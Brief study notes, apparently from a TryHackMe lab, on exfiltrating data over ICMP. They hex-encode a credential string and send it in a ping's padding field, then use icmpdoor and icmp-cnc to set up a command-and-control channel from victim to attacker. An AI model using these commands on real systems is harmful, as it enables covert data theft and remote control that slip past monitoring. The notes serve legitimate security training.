# How to exfiltrate data in ICMP Data Section
`echo "thm:tryhackme" | xxd -p` 
This will convert  our data in Hexadecimal encoding

ping 10.10.71.68 -c 1 -p 74686d3a7472796861636b6d650a
This will send one ICMP ping packet with Hex encoded message into "pad" data
Lastly it will be able to decode in wireshark under ICMP traffic.

# How tom exfiltrate data with ICMP C2 Communication
*On the victim machine:
`sudo icmpdoor -i eth0 -d 192.168.0.133`
Note that we specify the interface to communicate over and the destination IP of the server-side.
*On the attacking machine:
`sudo icmp-cnc -i eth1 -d 192.168.0.121`
Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP. As the previous terminal shows, we requested to execute the host-name command, and we received icmp-host.
